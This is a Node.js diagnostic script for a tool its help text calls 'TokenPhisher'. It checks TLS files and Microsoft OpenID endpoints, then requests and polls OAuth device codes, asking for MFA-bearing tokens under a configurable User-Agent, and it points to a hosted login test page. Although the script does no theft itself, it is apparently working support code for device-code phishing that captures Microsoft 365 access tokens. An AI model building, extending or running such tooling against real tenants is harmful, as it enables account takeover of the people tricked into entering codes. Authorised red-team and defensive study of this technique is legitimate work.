#!/usr/bin/env node

import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { parseArgs } from 'util';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const CONFIG_JSON = path.join(__dirname, 'config.json');

export const COMMON_ENDPOINTS = {
  tokenUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
  deviceCodeUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
};

export function publicUrl(config, pathname, rootDir = __dirname) {
  const host = config.tlsHostname || 'localhost';
  const scheme = config.testMode ? 'http' : 'https';
  const port = config.testMode ? config.httpPort : config.httpsPort;
  const defaultPort = config.testMode ? 80 : 443;
  const portSuffix = port === defaultPort ? '' : `:${port}`;
  const base = `${scheme}://${host}${portSuffix}`;
  return `${base}${pathname}`;
}

function resolveCertPath(certPath, rootDir) {
  return path.isAbsolute(certPath) ? certPath : path.join(rootDir, certPath);
}

function check(label, ok, detail = '') {
  return { label, ok, detail };
}

async function fetchOpenId(tenant) {
  const url = `https://login.microsoftonline.com/${encodeURIComponent(tenant)}/v2.0/.well-known/openid-configuration`;
  const response = await fetch(url);
  if (!response.ok) {
    throw new Error(`OpenID discovery failed (${response.status}) for ${tenant}`);
  }
  return response.json();
}

async function requestDeviceCode(oauthConfig) {
  const body = new URLSearchParams({
    client_id: oauthConfig.clientId,
    scope: oauthConfig.scopes,
    claims: '{"access_token": {"amr": {"values": ["ngcmfa", "mfa"]}}}',
  });

  const response = await fetch(oauthConfig.deviceCodeUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': oauthConfig.userAgent,
    },
    body,
  });

  const text = await response.text();
  let data;
  try {
    data = JSON.parse(text);
  } catch {
    throw new Error(`Device code response was not JSON (${response.status}): ${text.slice(0, 200)}`);
  }

  if (!response.ok) {
    throw new Error(data.error_description || data.error || `HTTP ${response.status}`);
  }

  if (!data.user_code || !data.device_code) {
    throw new Error('Device code response missing user_code or device_code');
  }

  return data;
}

async function pollOnce(oauthConfig, deviceCode) {
  const body = new URLSearchParams({
    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
    client_id: oauthConfig.clientId,
    code: deviceCode,
  });

  const response = await fetch(oauthConfig.tokenUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': oauthConfig.userAgent,
    },
    body,
  });

  return response.json();
}

async function testOAuthFlow(oauthConfig, label) {
  const device = await requestDeviceCode(oauthConfig);
  const poll = await pollOnce(oauthConfig, device.device_code);

  let pollDetail = JSON.stringify(poll);
  if (poll.error === 'authorization_pending') {
    pollDetail = 'authorization_pending (expected before login)';
  } else if (poll.access_token) {
    pollDetail = 'access_token returned';
  }

  return {
    label,
    deviceCodeUrl: oauthConfig.deviceCodeUrl,
    userCode: device.user_code,
    pollOk: poll.error === 'authorization_pending' || Boolean(poll.access_token),
    pollDetail,
  };
}

export async function runSmokeTests(config, { rootDir = __dirname } = {}) {
  const checks = [];

  checks.push(check('Config loaded', true, config.microsoftTenant || config.tlsHostname || 'ok'));

  if (config.testMode) {
    checks.push(check('TLS mode', true, 'testMode — HTTP only'));
  } else {
    for (const key of ['keyFilePath', 'certFilePath']) {
      const filePath = resolveCertPath(config[key], rootDir);
      checks.push(check(`TLS file: ${key}`, fs.existsSync(filePath), filePath));
    }
  }

  if (config.microsoftTenant) {
    try {
      const discovery = await fetchOpenId(config.microsoftTenant);
      checks.push(
        check('OpenID discovery', true, config.microsoftTenant),
        check('tokenUrl matches discovery', config.tokenUrl === discovery.token_endpoint, discovery.token_endpoint),
        check(
          'deviceCodeUrl matches discovery',
          config.deviceCodeUrl === discovery.device_authorization_endpoint,
          discovery.device_authorization_endpoint
        )
      );
    } catch (error) {
      checks.push(check('OpenID discovery', false, error.message));
    }
  }

  let production;
  try {
    production = await testOAuthFlow(config, 'Production tenant OAuth');
    checks.push(check('Production device code', true, `user_code=${production.userCode}`));
    checks.push(check('Production token poll', production.pollOk, production.pollDetail));
  } catch (error) {
    checks.push(check('Production device code', false, error.message));
  }

  let common;
  try {
    common = await testOAuthFlow({ ...config, ...COMMON_ENDPOINTS }, 'Common (/common/) OAuth');
    checks.push(check('Common device code', true, `user_code=${common.userCode}`));
    checks.push(check('Common token poll', common.pollOk, common.pollDetail));
  } catch (error) {
    checks.push(check('Common device code', false, error.message));
  }

  return {
    ok: checks.every((item) => item.ok),
    checks,
    production,
    common,
    configSummary: {
      tenant: config.microsoftTenant,
      clientId: config.clientId,
      tokenUrl: config.tokenUrl,
      deviceCodeUrl: config.deviceCodeUrl,
      testMode: config.testMode,
    },
  };
}

function pass(label, detail = '') {
  console.log(`  ✓ ${label}${detail ? ` — ${detail}` : ''}`);
}

function fail(label, detail = '') {
  console.log(`  ✗ ${label}${detail ? ` — ${detail}` : ''}`);
}

function loadConfig(configPath) {
  if (!fs.existsSync(configPath)) {
    throw new Error(`Config not found: ${configPath}. Run npm run setup first.`);
  }
  return JSON.parse(fs.readFileSync(configPath, 'utf8'));
}

function printHelp() {
  console.log(`TokenPhisher smoke test (CLI diagnostics)

Usage:
  node smoke-test.mjs [options]

Checks config, TLS, and OAuth API without a browser login.
For a real login test, visit /smoke-test while the server is running.

Options:
  --config <file>     Config file (default: ./config.json)
  --live-url <url>    Also fetch a running page (server must be up)
  --help              Show this help

Examples:
  npm run smoke-test
  npm run smoke-test -- --live-url https://share.example.com/smoke-test
`);
}

async function main() {
  const { values } = parseArgs({
    options: {
      config: { type: 'string', default: CONFIG_JSON },
      'live-url': { type: 'string' },
      help: { type: 'boolean', short: 'h', default: false },
    },
    allowPositionals: false,
  });

  if (values.help) {
    printHelp();
    return;
  }

  console.log('TokenPhisher smoke test\n');

  const config = loadConfig(path.resolve(values.config));
  pass('Loaded config', values.config);

  const results = await runSmokeTests(config, { rootDir: path.dirname(path.resolve(values.config)) });

  for (const item of results.checks) {
    if (item.ok) {
      pass(item.label, item.detail);
    } else {
      fail(item.label, item.detail);
    }
  }

  if (values['live-url']) {
    const response = await fetch(values['live-url']);
    if (response.ok) {
      pass('Live URL reachable', values['live-url']);
    } else {
      fail('Live URL reachable', `HTTP ${response.status}`);
    }
  }

  console.log(`\nSmoke test ${results.ok ? 'passed' : 'failed'}.`);
  if (config.tlsHostname) {
    console.log(`Login test in browser: ${publicUrl(config, '/smoke-test')}`);
  }

  if (!results.ok) {
    process.exit(1);
  }
}

const isMain = process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url);
if (isMain) {
  main().catch((error) => {
    console.error(`\nSmoke test failed: ${error.message}`);
    process.exit(1);
  });
}
